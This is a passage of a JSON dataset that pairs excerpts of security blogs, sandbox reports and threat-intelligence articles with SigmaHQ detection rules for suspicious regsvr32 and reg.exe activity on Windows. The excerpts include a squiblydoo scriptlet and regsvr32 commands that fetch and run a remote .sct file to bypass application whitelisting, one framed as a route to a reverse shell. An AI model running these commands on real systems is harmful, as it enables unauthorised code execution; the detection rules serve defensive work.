    "markdown": "# regsvr32 regsvr32 (squiblydoo) code execution - bypass application whitelisting. ## Execution ``` <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"TESTING\" classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" > <script language=\"JScript\"> <![CDATA[ var foo = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </registration> </scriptlet> ``` We need to host the back.sct on a web server so we can invoke it like so: ``` regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll ``` ## Observations ```image Alt: calc.exe spawned by regsvr32.exe Description: The image displays a screenshot of a process list from a system monitoring tool. It highlights the process 'regsvr32.exe' in red, indicating its execution at a specific time (11:26:04 PM on 7/12/2018). The list shows",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of Regsvr32",
      "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-april-2022/",
        "https://www.echotrail.io/insights/search/regsvr32.exe",
        "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo"
      ],
      "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-05-05",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\regsvr32.exe",
          "Image|endswith": [
            "\\calc.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\werfault.exe",
          "CommandLine|contains": " -u -p "
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely, but can rarely occur. Apply additional filters accordingly."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_child_process.yml"
  },
  "406": {
    "url": "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
    "markdown": "# Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files) **Wednesday, April 26, 2017** So, I have been working this out the last few days. I was trying to solve a particular problem. I needed a reverse shell on a workstation locked down by AppLocker executable and script rules enforced. **tl;dr** `regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll` I have been researching fileless persistence mechanisms. And it led me to a dark place. I would wish on no mortal. COM+. I posted earlier about .sct files. This link describes what they are. In short, they are XML documents",
    "sigma_rule": {
      "title": "Regsvr32 Execution From Potential Suspicious Location",
      "id": "9525dc73-0327-438c-8c04-13c0e037e9da",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might execute \"regsvr32\" with DLLs located in %TEMP% or in %PROGRAMDATA%. Apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_exec_path_1.yml"
  },
  "407": {
    "url": "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/",
    "markdown": "# General Info | **File name:** | **hola.doc** | | ------------------ | -------------------------------------------------------------------------------------- | | **Full analysis:** | https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad | | **Verdict:** | Malicious activity | | **Threats:** | Trojan | | **Analysis date:** | July 15, 2021 at 18:49:35 | | **OS:** | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit) | | **Tags:** | trojan | | **Indicators:** | Multiprocessing, Network threats | | **MIME:** | text/xml | | **File info:** | XML 1.0 document, UTF-8 Unicode text, with very long lines, with CRLF line terminators | | **MD5:** | 843F6C0C24BFC31B6A19471935A092DA | | **SHA1:** | 7B811D26A4852B9D564C4DAB878BD672BBBE7078",
    "sigma_rule": {
      "title": "Regsvr32 Execution From Potential Suspicious Location",
      "id": "9525dc73-0327-438c-8c04-13c0e037e9da",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might execute \"regsvr32\" with DLLs located in %TEMP% or in %PROGRAMDATA%. Apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_exec_path_1.yml"
  },
  "408": {
    "url": "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/",
    "markdown": "# CONTInuing the Bazar Ransomware Story **Categories:** adfind bazar cobaltstrike conti ransomware **Published on:** November 29, 2021 In this report we will discuss a case from early August where we witnessed threat actors utilizing BazarLoader and Cobalt Strike to accomplish their mission of encrypting systems with Conti ransomware. The normal list of discovery tools were used during this case such as AdFind, Net, Ping, PowerView, and Nltest. Rclone was used to exfiltrate company data to Mega and Process Hacker was used to dump LSASS. The threat actors executed a Conti batch file on a server which then encrypted most of",
    "sigma_rule": {
      "title": "Regsvr32 DLL Execution With Suspicious File Extension",
      "id": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of REGSVR32.exe with DLL files masquerading as other files",
      "references": [
        "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/",
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://guides.lib.umich.edu/c.php?g=282942&p=1885348"
      ],
      "author": "Florian Roth (Nextron Systems), frack113",
      "date": "2021-11-29",
      "modified": "2023-05-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".bin",
            ".bmp",
            ".cr2",
            ".dat",
            ".eps",
            ".gif",
            ".ico",
            ".jpeg",
            ".jpg",
            ".nef",
            ".orf",
            ".png",
            ".raw",
            ".sr2",
            ".temp",
            ".tif",
            ".tiff",
            ".tmp",
            ".rtf",
            ".txt"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_extensions.yml"
  },
  "409": {
    "url": "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
    "markdown": "# Threat hunting in large datasets by clustering security events _Monday, October 4, 2021_ [How Talos finds threats in large data sets](https://www.youtube.com/watch?v=5nFIgAN5Nq4) * Security tools can produce very large amounts of data that even the most sophisticated organizations may struggle to manage. * Big data processing tools, such as Spark, can be a powerful tool in the arsenal of security teams. * This post walks through threat hunting on large datasets by clustering similar events to reduce search space and provide additional context. ## Introduction Cisco Talos processes 1.5 million new pieces of malware each day. Converting such a large",
    "sigma_rule": {
      "title": "Regsvr32 DLL Execution With Suspicious File Extension",
      "id": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of REGSVR32.exe with DLL files masquerading as other files",
      "references": [
        "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/",
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://guides.lib.umich.edu/c.php?g=282942&p=1885348"
      ],
      "author": "Florian Roth (Nextron Systems), frack113",
      "date": "2021-11-29",
      "modified": "2023-05-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".bin",
            ".bmp",
            ".cr2",
            ".dat",
            ".eps",
            ".gif",
            ".ico",
            ".jpeg",
            ".jpg",
            ".nef",
            ".orf",
            ".png",
            ".raw",
            ".sr2",
            ".temp",
            ".tif",
            ".tiff",
            ".tmp",
            ".rtf",
            ".txt"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_extensions.yml"
  },
  "410": {
    "url": "https://guides.lib.umich.edu/c.php?g=282942&p=1885348",
    "markdown": "# All About Images Focuses on many common image questions in regards to image resolutions, resizing images, file types, vector and raster images, scanning, saving and more. ## Native File Formats Not only are there image formats, but many applications have their own native file format. It is important to understand that there is a difference between a native file type and an image file type. An example of a native file type is a `.PSD` which stands for Photoshop Document. This file is created only by Adobe Photoshop and can retain information such as layers, adjustments, masks, and other",
    "sigma_rule": {
      "title": "Regsvr32 DLL Execution With Suspicious File Extension",
      "id": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of REGSVR32.exe with DLL files masquerading as other files",
      "references": [
        "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/",
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://guides.lib.umich.edu/c.php?g=282942&p=1885348"
      ],
      "author": "Florian Roth (Nextron Systems), frack113",
      "date": "2021-11-29",
      "modified": "2023-05-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".bin",
            ".bmp",
            ".cr2",
            ".dat",
            ".eps",
            ".gif",
            ".ico",
            ".jpeg",
            ".jpg",
            ".nef",
            ".orf",
            ".png",
            ".raw",
            ".sr2",
            ".temp",
            ".tif",
            ".tiff",
            ".tmp",
            ".rtf",
            ".txt"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_extensions.yml"
  },
  "411": {
    "url": "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
    "markdown": "# Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files) **Wednesday, April 26, 2017** So, I have been working this out the last few days. I was trying to solve a particular problem. I needed a reverse shell on a workstation locked down by AppLocker executable and script rules enforced. **tl;dr** `regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll` I have been researching fileless persistence mechanisms. And it led me to a dark place. I would wish on no mortal. COM+. I posted earlier about .sct files. This link describes what they are. In short, they are XML documents",
    "sigma_rule": {
      "title": "Scripting/CommandLine Process Spawned Regsvr32",
      "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": "\\regsvr32.exe"
        },
        "filter_main_rpcproxy": {
          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
          "CommandLine|endswith": " /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary",
        "Some legitimate Windows services"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_parent.yml"
  },
  "412": {
    "url": "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/",
    "markdown": "# General Info | **File name:** | **hola.doc** | | ------------------ | -------------------------------------------------------------------------------------- | | **Full analysis:** | https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad | | **Verdict:** | Malicious activity | | **Threats:** | Trojan | | **Analysis date:** | July 15, 2021 at 18:49:35 | | **OS:** | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit) | | **Tags:** | trojan | | **Indicators:** | Multiprocessing, Network threats | | **MIME:** | text/xml | | **File info:** | XML 1.0 document, UTF-8 Unicode text, with very long lines, with CRLF line terminators | | **MD5:** | 843F6C0C24BFC31B6A19471935A092DA | | **SHA1:** | 7B811D26A4852B9D564C4DAB878BD672BBBE7078",
    "sigma_rule": {
      "title": "Scripting/CommandLine Process Spawned Regsvr32",
      "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": "\\regsvr32.exe"
        },
        "filter_main_rpcproxy": {
          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
          "CommandLine|endswith": " /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary",
        "Some legitimate Windows services"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_parent.yml"
  },
  "413": {
    "url": "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/",
    "markdown": "# Exchange Exploit Leads to Domain Wide Ransomware **Categories:** exploit Fast Reverse Proxy PHOSPHORUS Plink ProxyShell ransomware **Published on:** November 15, 2021 In late September 2021, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case were attributed to a group Microsoft tracks as PHOSPHORUS (possible overlap with UNC2448, NemesisKitten, and DEV-0270) which is suspected to be an Iranian nation state operator. ProxyShell was used to deploy multiple web shells which lead to discovery actions, dumping of LSASS, use of Plink and Fast Reverse",
    "sigma_rule": {
      "title": "Suspicious Reg Add BitLocker",
      "id": "0e0255bf-2548-47b8-9582-c0955c9283f5",
      "status": "test",
      "description": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility",
      "references": [
        "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"
      ],
      "author": "frack113",
      "date": "2021-11-15",
      "modified": "2022-09-09",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "REG",
            "ADD",
            "\\SOFTWARE\\Policies\\Microsoft\\FVE",
            "/v",
            "/f"
          ],
          "CommandLine|contains": [
            "EnableBDEWithNoTPM",
            "UseAdvancedStartup",
            "UseTPM",
            "UseTPMKey",
            "UseTPMKeyPIN",
            "RecoveryKeyMessageSource",
            "UseTPMPIN",
            "RecoveryKeyMessage"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_bitlocker.yml"
  },
  "414": {
    "url": "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
    "markdown": "# Qbot Likes to Move It, Move It **Category:** Qbot **Published on:** February 7, 2022 ## Introduction Qbot (aka QakBot, Quakbot, Pinkslipbot) has been around for a long time, having first been observed back in 2007. More info on Qbot can be found at the following links: Microsoft & Red Canary. In this case, from October 2021, we will break down how Qbot quickly spread across all workstations in an environment, while stealing browser information and emails. While the case is nearly 5 months old, Qbot infections in the past week have followed the same pattern. ## Case Summary We",
    "sigma_rule": {
      "title": "Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE",
      "id": "48917adc-a28e-4f5d-b729-11e75da8941f",
      "status": "test",
      "description": "Detects the usage of \"reg.exe\" to add Defender folder exclusions. Qbot has been seen using this technique to add exclusions for folders within AppData and ProgramData.",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
        "https://redcanary.com/threat-detection-report/threats/qbot/"
      ],
      "author": "frack113",
      "date": "2022-02-13",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains": [
            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
            "SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths"
          ],
          "CommandLine|contains|all": [
            "ADD ",
            "/t ",
            "REG_DWORD ",
            "/v ",
            "/d ",
            "0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_defender_exclusion.yml"
  },
  "415": {
    "url": "https://redcanary.com/threat-detection-report/threats/qbot/",
    "markdown": "# Qbot After a government takedown in August, Qbot affiliates resumed activity in late 2023 after adopting new malware and infrastructure. ## OVERALL RANK **#8** ## CUSTOMERS AFFECTED **2.9%** --- ## Threat Sounds <iframe allowfullscreen=\"allowfullscreen\" frameborder=\"0\" src=\"https://open.spotify.com/embed/track/0boXJ9srSz8k62oWedG8fK?utm_source=generator\" style=\"border-radius: 12px;\"></iframe> Last summer’s much-hyped Qbot takedown appeared to only last for a few weeks. Do you have to let it linger, Qbot affiliates? Do you have to? --- ## Analysis Also known as “Qakbot,” the Qbot banking trojan has been active since at least 2007. Initially focused on stealing user data and banking credentials, Qbot’s functionality has expanded to incorporate features such",
    "sigma_rule": {
      "title": "Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE",
      "id": "48917adc-a28e-4f5d-b729-11e75da8941f",
      "status": "test",
      "description": "Detects the usage of \"reg.exe\" to add Defender folder exclusions. Qbot has been seen using this technique to add exclusions for folders within AppData and ProgramData.",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
        "https://redcanary.com/threat-detection-report/threats/qbot/"
      ],
      "author": "frack113",
      "date": "2022-02-13",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains": [
            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
            "SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths"
          ],
          "CommandLine|contains|all": [
            "ADD ",
            "/t ",
            "REG_DWORD ",
            "/v ",
            "/d ",
            "0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_defender_exclusion.yml"
  },
  "416": {
    "url": "https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html",
    "markdown": "# AvosLocker Ransomware Variant Abuses Driver File to Disable Antivirus, Scans for Log4shell **Ransomware** *May 02, 2022* We found an AvosLocker ransomware variant using a legitimate antivirus component to disable detection and blocking solutions. --- ## Infection chain We found samples of AvosLocker ransomware that makes use of a legitimate driver file to disable antivirus solutions and detection evasion. While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (*asWarPot.sys*). In addition, the ransomware is also capable of",
    "sigma_rule": {
      "title": "SafeBoot Registry Key Deleted Via Reg.EXE",
      "id": "fc0e89b5-adb0-43c1-b749-c12a10ec37de",
      "related": [
        {
          "id": "d7662ff6-9e97-4596-a61d-9839e32dee8d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Tim Shelton",
      "date": "2022-08-08",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_delete": {
          "CommandLine|contains|all": [
            " delete ",
            "\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_delete_safeboot.yml"
  },
  "417": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
    "markdown": "",
    "sigma_rule": {
      "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
      "id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
      "related": [
        {
          "id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
        "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "frack113",
      "date": "2023-01-13",
      "modified": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa\\",
            "DisableRestrictedAdmin"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_disable_restricted_admin.yml"
  },
  "418": {
    "url": "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
    "markdown": "# Remote Desktop Services: Enable Restricted Admin mode ## Summary This step-by-step article describes how to enable RestrictedAdmin mode for Remote Desktop. RestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop. This prevents your credentials from being harvested during the initial connection process if the remote server has been compromised. **NOTE:** RestrictedAdmin mode must be explicitly enabled on the destination systems using the Registry setting below, and the account being used to connect must be a member of the local Administrators group on the destination system. ## Steps To enable",
    "sigma_rule": {
      "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
      "id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
      "related": [
        {
          "id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
        "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "frack113",
      "date": "2023-01-13",
      "modified": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa\\",
            "DisableRestrictedAdmin"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
